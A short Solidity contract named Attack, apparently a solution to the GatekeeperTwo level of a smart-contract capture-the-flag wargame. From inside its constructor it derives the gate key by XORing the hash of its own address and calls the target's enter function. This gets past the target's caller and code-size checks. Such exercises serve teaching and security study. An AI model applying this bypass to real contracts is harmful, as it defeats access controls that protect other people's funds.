// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}
contract Attack {
    constructor(address addr) {
        GatekeeperTwo g = GatekeeperTwo(addr);
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
        g.enter(gateKey);
    }
}